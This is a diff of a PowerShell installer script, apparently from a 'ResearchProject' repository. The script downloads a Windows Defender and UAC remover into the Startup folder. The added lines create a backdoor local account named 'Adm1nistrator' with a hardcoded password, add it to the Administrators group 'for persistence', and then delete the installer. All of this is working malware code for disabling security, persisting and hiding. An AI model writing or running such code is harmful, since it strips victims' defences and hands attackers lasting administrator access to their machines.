@@ -28,10 +28,29 @@ $url = "https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads
 $outFile = Join-Path $startupPath "disableWinDef.ps1"
 Invoke-WebRequest -Uri $url -OutFile $outFile
 
-# remove windows defender and uac
+# Download windows defender and uac remover
 $startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
 $url = "https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/defender_remover13.exe"
 $outFile = Join-Path $startupPath "defender_remover.exe"
 Invoke-WebRequest -Uri $url -OutFile $outFile
+
+# Create Admin account for persistence
+# Run PowerShell as Administrator
+
+$username = "Adm1nistrator"
+$password = "Pa$$w0rd"
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+
+# Create local user
+New-LocalUser `
+    -Name $username `
+    -Password $securePassword `
+    -FullName $username `
+    -Description "Local admin account" `
+    -PasswordNeverExpires `
+    -AccountNeverExpires
+
+# Add user to Administrators group
+Add-LocalGroupMember -Group "Administrators" -Member $username
 
 Remove-Item installer.ps1
